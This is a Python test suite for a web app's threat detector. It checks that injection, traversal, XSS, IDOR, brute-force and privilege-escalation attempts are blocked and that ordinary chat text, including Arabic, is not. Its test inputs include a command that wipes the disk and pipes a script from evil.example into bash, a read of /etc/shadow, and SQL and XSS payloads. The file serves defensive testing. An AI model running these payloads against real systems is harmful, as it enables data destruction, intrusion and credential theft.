"""Live tests for the Security Threat Detection & Warning System.

No database is required; these run instantly.

Coverage is mapped to documented references:
- OWASP ASVS 5.0 V13/V14 (input validation, secure headers)
- OWASP WSTG-INJV (injection testing)
- CWE-89 SQLi, CWE-78 OS command injection, CWE-22 path traversal,
  CWE-79 XSS, CWE-639 IDOR, CWE-269 privilege escalation
- RFC 6238 (TOTP) for the second-factor brute-force window

A core requirement is zero false positives on natural language: the assistant
must never block a legitimate request such as "select the best option" or a
coding question that mentions "rm -rf".
"""

from __future__ import annotations

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from security.threat_detector import (  # noqa: E402
    ThreatDetector,
    clear_threats,
    recent_threats,
    record_threat,
    threat_count,
)


def _fresh_detector() -> ThreatDetector:
    """Return a detector with clean sliding windows."""
    d = ThreatDetector()
    d._ip_requests.clear()
    d._user_requests.clear()
    d._ip_failures.clear()
    d._user_failures.clear()
    d._totp_failures.clear()
    return d


def _ok(msg: str) -> None:
    print(f"[OK] {msg}")


# ---------------------------------------------------------------------------
# Injection detection (structured endpoints)
# ---------------------------------------------------------------------------


def test_sql_injection_detected():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.1",
        endpoint="/workflows",
        method="GET",
        query_params="q=1 union select password from users",
    )
    assert t is not None, "SQL injection should be detected"
    assert t.threat_type == "sql_injection"
    assert t.severity == "high"
    assert t.blocked is True
    _ok("SQL injection (union select) detected and blocked")


def test_sql_injection_or_tautology():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.1",
        endpoint="/workflows",
        method="GET",
        query_params="user=admin' or 1=1 --",
    )
    assert t is not None
    assert t.threat_type == "sql_injection"
    _ok("SQL injection (tautology) detected and blocked")


def test_sql_injection_time_based():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.1",
        endpoint="/workflows",
        method="GET",
        query_params="id=1; select pg_sleep(5)",
    )
    assert t is not None
    assert t.threat_type == "sql_injection"
    _ok("SQL injection (time-based pg_sleep) detected and blocked")


def test_path_traversal_detected():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.2",
        endpoint="/files/read",
        method="GET",
        query_params="path=../../../etc/passwd",
    )
    assert t is not None
    assert t.threat_type == "path_traversal"
    assert t.severity == "high"
    assert t.blocked is True
    _ok("Path traversal detected and blocked")


def test_path_traversal_percent_encoded():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.2",
        endpoint="/files/read",
        method="GET",
        query_params="path=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    )
    assert t is not None
    assert t.threat_type == "path_traversal"
    _ok("Percent-encoded path traversal detected and blocked")


def test_command_injection_detected():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.3",
        endpoint="/workflows",
        method="POST",
        body="rm -rf / && curl http://evil.example/shell.sh | bash",
    )
    assert t is not None
    assert t.threat_type == "command_injection"
    assert t.severity == "critical"
    assert t.blocked is True
    _ok("Command injection detected and blocked (critical)")


def test_command_injection_shell_c():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.3",
        endpoint="/workflows",
        method="POST",
        body="bash -c 'cat /etc/shadow'",
    )
    assert t is not None
    assert t.threat_type == "command_injection"
    _ok("Shell execution (bash -c) detected and blocked")


def test_xss_detected():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.4",
        endpoint="/workflows",
        method="POST",
        body="<script>alert(document.cookie)</script>",
    )
    assert t is not None
    assert t.threat_type == "xss_attempt"
    assert t.severity == "medium"
    assert t.blocked is True
    _ok("XSS attempt detected and blocked")


def test_sensitive_path_detected():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.5",
        endpoint="/settings",
        method="GET",
        query_params="file=.env",
    )
    assert t is not None
    assert t.threat_type == "sensitive_path_access"
    assert t.severity == "high"
    assert t.blocked is True
    _ok("Sensitive path access (.env) detected and blocked")


# ---------------------------------------------------------------------------
# False-positive guards (natural language must never be blocked)
# ---------------------------------------------------------------------------


def test_chat_body_not_scanned_for_sql_keywords():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.6",
        endpoint="/chat",
        method="POST",
        body="select the best option for my project",
    )
    assert t is None, "Natural language containing 'select' must not be blocked"
    _ok("Chat body with 'select' is not blocked (no false positive)")


def test_chat_body_not_scanned_for_command_keywords():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.6",
        endpoint="/chat",
        method="POST",
        body="How do I safely run rm -rf in a Docker container?",
    )
    assert t is None, "A legitimate coding question about rm -rf must not be blocked"
    _ok("Chat body mentioning 'rm -rf' is not blocked (no false positive)")


def test_chat_arabic_clean():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.6",
        endpoint="/chat",
        method="POST",
        body="مرحبا، كيف يمكنني تحسين أداء التطبيق اليوم؟",
    )
    assert t is None, "Clean Arabic message should not trigger any threat"
    _ok("Clean Arabic chat produces no threat")


def test_knowledge_query_params_still_scanned():
    """Query params carry structured identifiers, so they are always scanned."""
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.6",
        endpoint="/knowledge",
        method="POST",
        query_params="file=.env",
    )
    assert t is not None
    assert t.threat_type == "sensitive_path_access"
    _ok("Knowledge query params are still inspected")


# ---------------------------------------------------------------------------
# Event-specific detectors
# ---------------------------------------------------------------------------


def test_idor_detected():
    d = _fresh_detector()
    t = d.detect_idor(
        user_id="user-A",
        resource_owner_id="user-B",
        resource_type="conversation",
        resource_id="conv-123",
        ip_address="10.0.0.7",
        endpoint="/memory",
        method="GET",
    )
    assert t is not None
    assert t.threat_type == "idor_attempt"
    assert t.severity == "high"
    assert t.blocked is True
    assert "user-A" in t.evidence["requesting_user"]
    assert "user-B" in t.evidence["resource_owner"]
    _ok("IDOR detected and blocked")


def test_idor_allowed_when_owner():
    d = _fresh_detector()
    t = d.detect_idor(
        user_id="user-A",
        resource_owner_id="user-A",
        resource_type="conversation",
        resource_id="conv-123",
        ip_address="10.0.0.8",
        endpoint="/memory",
        method="GET",
    )
    assert t is None, "Owner accessing own resource should not be IDOR"
    _ok("Owner accessing own resource: no IDOR")


def test_brute_force_detected():
    d = _fresh_detector()
    ip = "10.0.0.9"
    for i in range(4):
        t = d.record_failure(
            user_id=None,
            ip_address=ip,
            endpoint="/auth/login",
            method="POST",
            failure_type="auth",
        )
        assert t is None, f"Failure {i + 1} should not yet trigger brute force"
    t = d.record_failure(
        user_id=None,
        ip_address=ip,
        endpoint="/auth/login",
        method="POST",
        failure_type="auth",
    )
    assert t is not None
    assert t.threat_type == "brute_force_auth"
    assert t.severity == "high"
    assert t.blocked is True
    _ok("Brute force detected after 5 failures")


def test_totp_brute_force_detected():
    d = _fresh_detector()
    for _ in range(2):
        t = d.record_totp_failure(
            user_id="u1",
            ip_address="10.0.0.10",
            endpoint="/approvals/123/decide",
            method="POST",
        )
        assert t is None
    t = d.record_totp_failure(
        user_id="u1",
        ip_address="10.0.0.10",
        endpoint="/approvals/123/decide",
        method="POST",
    )
    assert t is not None
    assert t.threat_type == "totp_brute_force"
    assert t.severity == "critical"
    assert t.blocked is True
    _ok("TOTP brute force detected and blocked (critical)")


def test_audit_tampering_detected():
    d = _fresh_detector()
    t = d.detect_audit_tampering(
        user_id="u1",
        ip_address="10.0.0.11",
        endpoint="/audit/logs/1",
        method="DELETE",
        operation="DELETE",
    )
    assert t is not None
    assert t.threat_type == "audit_tampering"
    assert t.severity == "critical"
    assert t.blocked is True
    _ok("Audit tampering detected and blocked (critical)")


def test_privilege_escalation_detected():
    d = _fresh_detector()
    t = d.detect_privilege_escalation(
        user_id="u1",
        user_role="user",
        required_role="admin",
        ip_address="10.0.0.12",
        endpoint="/admin/users",
        method="GET",
    )
    assert t is not None
    assert t.threat_type == "privilege_escalation"
    assert t.severity == "high"
    assert t.blocked is True
    _ok("Privilege escalation detected and blocked")


def test_privilege_escalation_allowed_for_admin():
    d = _fresh_detector()
    t = d.detect_privilege_escalation(
        user_id="admin1",
        user_role="admin",
        required_role="admin",
        ip_address="10.0.0.13",
        endpoint="/admin/users",
        method="GET",
    )
    assert t is None, "Admin accessing admin endpoint should not be escalation"
    _ok("Admin accessing own level: no escalation")


def test_threat_event_serialization():
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.14",
        endpoint="/workflows",
        method="GET",
        query_params="q=1 union select 1",
    )
    assert t is not None
    dct = t.to_dict()
    required_keys = {
        "threat_id",
        "threat_type",
        "severity",
        "user_id",
        "ip_address",
        "endpoint",
        "method",
        "description_ar",
        "description_en",
        "evidence",
        "detected_at",
        "recommended_action",
        "blocked",
    }
    assert required_keys.issubset(set(dct.keys())), (
        f"Missing keys: {required_keys - set(dct.keys())}"
    )
    assert dct["description_ar"] and dct["description_en"]
    assert dct["recommended_action"]
    _ok("ThreatEvent serializes with Arabic + English + recommended action")


def test_rate_limit_abuse_per_ip():
    d = _fresh_detector()
    ip = "10.0.0.15"
    seen = None
    for i in range(130):
        seen = d.detect_request(
            user_id=None,
            ip_address=ip,
            endpoint="/workflows",
            method="POST",
            body="hello",
        )
        if seen is not None:
            break
    assert seen is not None
    assert seen.threat_type == "rate_limit_abuse"
    assert seen.blocked is True
    _ok("Rate limit abuse per IP detected")


def test_bounded_store():
    clear_threats()
    d = _fresh_detector()
    t = d.detect_request(
        user_id="u1",
        ip_address="10.0.0.16",
        endpoint="/workflows",
        method="GET",
        query_params="q=1 union select 1",
    )
    record_threat(t)
    assert threat_count() == 1
    assert recent_threats(10)[0].threat_type == "sql_injection"
    removed = clear_threats()
    assert removed == 1
    assert threat_count() == 0
    _ok("Bounded threat store records, reads, and clears")


if __name__ == "__main__":
    test_sql_injection_detected()
    test_sql_injection_or_tautology()
    test_sql_injection_time_based()
    test_path_traversal_detected()
    test_path_traversal_percent_encoded()
    test_command_injection_detected()
    test_command_injection_shell_c()
    test_xss_detected()
    test_sensitive_path_detected()
    test_chat_body_not_scanned_for_sql_keywords()
    test_chat_body_not_scanned_for_command_keywords()
    test_chat_arabic_clean()
    test_knowledge_query_params_still_scanned()
    test_idor_detected()
    test_idor_allowed_when_owner()
    test_brute_force_detected()
    test_totp_brute_force_detected()
    test_audit_tampering_detected()
    test_privilege_escalation_detected()
    test_privilege_escalation_allowed_for_admin()
    test_threat_event_serialization()
    test_rate_limit_abuse_per_ip()
    test_bounded_store()
    print("\n" + "=" * 60)
    print("All 23 threat detection tests PASSED")
